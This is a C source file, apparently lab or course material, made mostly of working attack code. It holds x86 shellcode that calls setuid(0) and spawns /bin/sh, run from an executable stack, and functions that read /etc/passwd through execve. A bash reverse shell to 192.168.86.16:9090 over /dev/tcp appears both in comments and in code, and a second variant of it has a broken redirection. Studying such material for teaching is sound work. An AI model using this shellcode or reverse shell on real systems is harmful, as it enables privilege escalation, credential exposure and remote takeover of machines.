//  setuid0shell:   gcc -o setuid0shell ../src/setuid0shell.c
//  run shellcode:  gcc -z execstack -o setuid0shell ../src/setuid0shell.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void do_shell()
{
    char * name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve( name[0], name, NULL);
}

void do_setuid0shell(int n)
{
    setuid(n);
    char * name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve( name[0], name, NULL);
}

void doasm_setuid0()
{
    
    __asm__(
        "xor    %ebx,%ebx ;"    // if setuid(n): movb $n,%ebx;
        "xor    %eax,%eax ;"
        "movb   $0xd5,%al ;"
        "int    $0x80;" //"sysenter ;"
    );
    char * name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve( name[0], name, NULL);
}

char setuid0[]= //  setuid(0)
"\x31\xdb"  //xor    %ebx,%ebx
"\x31\xc0"  //xor    %eax,%eax
"\xb0\xd5"  //mov    $0xd5,%al
"\xcd\x80";  //int    $0x80

char shellcode_dosh[] = //  do "/bin/sh"
"\x31\xd2"              // xor    %edx,%edx
"\x52"                  // push   %edx
"\x68""n/sh"    //"\x68\x6e\x2f\x73\x68"  // push   $0x68732f6e   
"\x68""//bi"    //"\x68\x2f\x2f\x62\x69"  // push   $0x69622f2f   
"\x89\xe3"              // mov    %esp,%ebx
"\x52"                  // push   %edx
"\x53"                  // push   %ebx
"\x89\xe1"              // mov    %esp,%ecx
"\x8d\x42\x0b"          // lea    0xb(%edx),%eax
"\xcd\x80";             // int    $0x80

void do_shellcode()
{
    char attackStr[512];
    strcpy(attackStr, setuid0);
    strcat(attackStr, shellcode_dosh);
    ((void (*)())attackStr)();
}

int main(int argc, char * argv[])
{
    // do_shell();
    // do_setuid0shell(0);
    // doasm_setuid0();
    do_shellcode();
    return 0;
}










void f01do_more();
void f02gedit();
void reverse_shell();

int main02(int argc, char * argv[])
{
    f01do_more();  return 0;
    //f02gedit(); return 0;
    //reverse_shell();    return 0;
}

extern char * environ[];

void f01do_more()
{
    char * name[16];
    name[0] = "/bin/sh";
    name[1] = "-c";
    name[2] = "/bin/ls;  ls -l;  /bin/cat /etc/passwd";
    name[3] = NULL;
    execve( name[0], name, NULL );
    //execve( name[0], name, environ);
}

void f02gedit()
{
    char * name[16];
    name[0] = "/usr/bin/gedit";
    name[1] = "/etc/passwd";
    name[2] = NULL;

    char * envp[16];
    envp[0] = "DISPLAY=:0";
    envp[1] = "PWD=/home/i/ns/09/bin";
    envp[2] = NULL;

    //execve( name[0], name, envp);
    execve( name[0], name, envp);
}

void reverse_shell()
{
    // do the command on terminal:
    // /bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1
    // /bin/bash -c "/bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1"
    char * name[16];
    name[0] = "/bin/bash";
    name[1] = "-c";
    name[2] = "/bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1";
    name[3] = NULL;
    execve( name[0], name, NULL );
    //execve( name[0], name, environ);
}

void reverse_shell0()
{
    // do the command: /bin/bash -i > /dev/tcp/192.168.86.16/9090 0<&1 2>&1
    char * name[16];
    name[0] = "/bin/bash";
    name[1] = "-i";
    name[2] = ">";
    name[3] = "/dev/tcp/192.168.86.16/9090";
    name[4] = "0<&1";
    name[5] = "2>1&1";
    name[6] = NULL;
    execve( name[0], name, NULL );
    //execve( name[0], name, environ);
}

